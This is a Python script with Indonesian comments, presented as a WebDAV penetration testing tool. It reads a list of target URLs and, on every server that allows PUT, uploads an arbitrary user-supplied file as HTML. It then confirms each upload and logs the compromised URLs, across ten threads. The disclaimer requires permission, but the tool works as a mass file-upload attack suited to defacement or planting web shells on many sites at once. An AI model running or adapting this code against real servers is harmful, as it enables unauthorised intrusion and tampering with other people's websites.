#!/usr/bin/env python3
"""
WebDAV Penetration Testing Tool
================================
Tool untuk testing keamanan WebDAV servers dalam lingkup penetration testing.
Hanya digunakan untuk sistem yang Anda miliki atau dengan izin eksplisit.

Author: ZNX
Purpose: Penetration Testing & Security Assessment
"""

import requests
import os
import sys
import time
from colorama import Fore, Style, init
from urllib.parse import urljoin, urlparse
import threading
from concurrent.futures import ThreadPoolExecutor

# Initialize colorama untuk Windows compatibility
init()

class WebDAVTester:
    def __init__(self):
        self.success_count = 0
        self.fail_count = 0
        self.lock = threading.Lock()
        
    def banner(self):
        """Menampilkan banner aplikasi"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f'''\t{Fore.CYAN}××××××××××××××××××××××××××××××××××××{Style.RESET_ALL}''')
        print(f'''\t{Fore.CYAN}×{Style.RESET_ALL}                                  {Fore.CYAN}×{Style.RESET_ALL}''')
        print(f'''\t{Fore.CYAN}×{Style.RESET_ALL}      WebDAV Security Tester       {Fore.CYAN}×{Style.RESET_ALL}''')
        print(f'''\t{Fore.CYAN}×{Style.RESET_ALL}    Penetration Testing Tool       {Fore.CYAN}×{Style.RESET_ALL}''')
        print(f'''\t{Fore.CYAN}×{Style.RESET_ALL}         Coded By ZNX               {Fore.CYAN}×{Style.RESET_ALL}''')
        print(f'''\t{Fore.CYAN}×{Style.RESET_ALL}                                  {Fore.CYAN}×{Style.RESET_ALL}''')
        print(f'''\t{Fore.CYAN}××××××××××××××××××××××××××××××××××××{Style.RESET_ALL}''')
        print(f"\n{Fore.YELLOW}[!] DISCLAIMER: Hanya gunakan pada sistem milik Anda sendiri{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] atau dengan izin eksplisit dari pemilik sistem!{Style.RESET_ALL}\n")

    def validate_url(self, url):
        """Memvalidasi dan memformat URL dengan benar"""
        url = url.strip()
        if not url:
            return None
            
        # Tambahkan protokol jika tidak ada
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
            
        # Validasi URL format
        try:
            parsed = urlparse(url)
            if not parsed.netloc:
                return None
            return url
        except:
            return None

    def test_webdav_methods(self, url):
        """Test berbagai WebDAV methods pada target URL"""
        methods_to_test = ['OPTIONS', 'PROPFIND', 'PUT', 'DELETE', 'MOVE', 'COPY']
        webdav_methods = []
        
        try:
            # Test OPTIONS untuk melihat methods yang diizinkan
            response = requests.options(url, timeout=10)
            if 'Allow' in response.headers:
                allowed_methods = response.headers['Allow'].split(',')
                allowed_methods = [method.strip() for method in allowed_methods]
                webdav_methods = [method for method in methods_to_test if method in allowed_methods]
                
        except requests.exceptions.RequestException:
            pass
            
        return webdav_methods

    def test_webdav_put(self, url, test_file_content, filename):
        """Test WebDAV PUT method untuk upload file"""
        try:
            # Buat URL lengkap dengan nama file
            target_url = urljoin(url.rstrip('/') + '/', filename)
            
            # Setup headers untuk WebDAV
            headers = {
                'Content-Type': 'text/html',
                'User-Agent': 'WebDAV Security Tester',
            }
            
            # Kirim PUT request
            session = requests.Session()
            session.headers.update(headers)
            
            response = session.put(target_url, data=test_file_content, timeout=15)
            
            return response, target_url
            
        except requests.exceptions.RequestException as e:
            return None, None

    def verify_upload(self, target_url):
        """Verifikasi apakah file berhasil diupload dengan GET request"""
        try:
            verify_response = requests.get(target_url, timeout=10)
            return verify_response.status_code == 200
        except:
            return False

    def process_single_target(self, target_url, test_file_content, filename):
        """Memproses satu target URL"""
        # Validasi URL
        validated_url = self.validate_url(target_url)
        if not validated_url:
            return
            
        try:
            # Test WebDAV methods yang tersedia
            webdav_methods = self.test_webdav_methods(validated_url)
            
            if 'PUT' not in webdav_methods:
                print(f"{Fore.YELLOW}[INFO]{Style.RESET_ALL} {validated_url} - PUT method tidak diizinkan")
                with self.lock:
                    self.fail_count += 1
                return
            
            # Test PUT upload
            response, target_file_url = self.test_webdav_put(validated_url, test_file_content, filename)
            
            if response and response.status_code in [200, 201, 204]:
                # Verifikasi upload berhasil
                if self.verify_upload(target_file_url):
                    print(f"{Fore.GREEN}[SUCCESS]{Style.RESET_ALL} {target_file_url}")
                    
                    # Simpan hasil sukses
                    with self.lock:
                        with open("webdav_success.txt", "a") as f:
                            f.write(f"{target_file_url}\n")
                        self.success_count += 1
                else:
                    print(f"{Fore.YELLOW}[PARTIAL]{Style.RESET_ALL} {validated_url} - Upload response OK tapi file tidak dapat diakses")
                    with self.lock:
                        self.fail_count += 1
            else:
                status_code = response.status_code if response else "No Response"
                print(f"{Fore.RED}[FAIL]{Style.RESET_ALL} {validated_url} - Status: {status_code}")
                with self.lock:
                    self.fail_count += 1
                    
        except Exception as e:
            print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} {validated_url} - {str(e)}")
            with self.lock:
                self.fail_count += 1

    def run_scan(self):
        """Fungsi utama untuk menjalankan scan WebDAV"""
        try:
            # Input file list
            list_file = input(f"{Fore.CYAN}[+]{Style.RESET_ALL} Masukkan file list target: ")
            if not os.path.exists(list_file):
                print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} File {list_file} tidak ditemukan!")
                return
                
            # Input test file
            test_file = input(f"{Fore.CYAN}[+]{Style.RESET_ALL} Masukkan file test untuk upload: ")
            if not os.path.exists(test_file):
                print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} File {test_file} tidak ditemukan!")
                return
                
            # Baca konten file test
            with open(test_file, 'r', encoding='utf-8') as f:
                test_file_content = f.read()
                
            # Nama file untuk upload (tambahkan timestamp untuk uniqueness)
            filename = f"test_{int(time.time())}_{os.path.basename(test_file)}"
            
            # Baca daftar target
            with open(list_file, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
                
            if not targets:
                print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} File list kosong!")
                return
                
            print(f"\n{Fore.CYAN}[INFO]{Style.RESET_ALL} Memulai scan {len(targets)} target...")
            print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Test file: {filename}")
            print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Menggunakan 10 thread untuk scanning...")
            
            # Reset counter
            self.success_count = 0
            self.fail_count = 0
            
            # Jalankan multi-threaded scanning
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = []
                for target in targets:
                    future = executor.submit(self.process_single_target, target, test_file_content, filename)
                    futures.append(future)
                    time.sleep(0.1)  # Small delay to avoid overwhelming targets
                
                # Wait for all threads to complete
                for future in futures:
                    future.result()
                    
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[INFO]{Style.RESET_ALL} Scan dihentikan oleh user")
        except Exception as e:
            print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} {str(e)}")

    def show_results(self):
        """Menampilkan hasil akhir scan"""
        print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[HASIL SCAN]{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Berhasil: {self.success_count}")
        print(f"{Fore.RED}[-]{Style.RESET_ALL} Gagal: {self.fail_count}")
        print(f"{Fore.CYAN}[+]{Style.RESET_ALL} Total: {self.success_count + self.fail_count}")
        
        if self.success_count > 0:
            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Target yang berhasil disimpan di: webdav_success.txt")
        print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")

def main():
    """Main function"""
    tester = WebDAVTester()
    tester.banner()
    
    try:
        tester.run_scan()
    finally:
        tester.show_results()

if __name__ == "__main__":
    main()